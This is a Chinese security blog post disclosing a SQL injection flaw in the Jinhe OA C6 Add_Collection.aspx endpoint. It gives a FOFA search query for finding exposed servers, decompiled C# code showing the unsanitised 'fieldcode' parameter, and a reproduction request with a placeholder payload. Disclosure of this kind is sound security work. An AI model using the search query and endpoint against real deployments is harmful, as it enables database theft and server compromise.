---
title: "金和OA Add_Collection.aspx SQL注入漏洞"
source: https://mrxn.net/jswz/jhsoft-Add_Collection-sqli.html
asset_dir: assets/金和oa-add_collection.aspx-sql注入漏洞
---

# 金和OA Add\_Collection.aspx SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2026/1/14 13:31
* 226浏览
* [0评论](#comment)
* 11分钟阅读

深入探索

数据库

服务器

SQL


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `Add_Collection.aspx` 接口处存在SQL注入漏洞，攻击者除了可以利用[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

深入探索

计算机安全

网络安全课程

网页浏览器

根据 `Add_Collection.aspx` 的源码，在 `bin` 目录下查找 `JHBase.Web.Govset.dll` 将其进行反编译后找到 **Add\_Collection** 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  this.fieldcode = this.Request["fieldcode"] == null ? "" : this.Request.QueryString["fieldcode"];
  if (((Control) this).Page.IsPostBack)
    return;
  DataTable dataTable = DBOperatorFactory.GetDBOperator().ExecSQLReDataTable($"select * from tb_hyz_govfieldmore where fieldcode='{this.fieldcode}'");
  if (dataTable == null || ((InternalDataCollectionBase) dataTable.Rows).Count <= 0)
    return;
  ((HtmlInputControl) this.hidden1).Value = dataTable.Rows[0]["fiedlcollection"].ToString();
}
```

参数`fieldcode`被直接拼接进SQL语句执行，从而造成[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5)漏洞。

# 漏洞复现

```
GET /c6/Jhsoft.Web.govset/Add_Collection.aspx/?fieldcode=SQLI_POC HTTP/1.1
Host: jhsoft.mrxn.net
```

[![金和OA Add_Collection.aspx SQL注入漏洞](images/img-001-bbd6d77beab9.webp)](https://image.mrxn.net/b115108be27d41f28f78b5aeabffdafa.webp)

成功延时 4 秒

代码安全审计

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[金和OA Add\_Collection.aspx SQL注入漏洞](https://mrxn.net/jswz/jhsoft-Add_Collection-sqli.html)  
文章链接：<https://mrxn.net/jswz/jhsoft-Add_Collection-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-Add\_Collection-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

漏洞修复方案

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-Add\_Collection-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 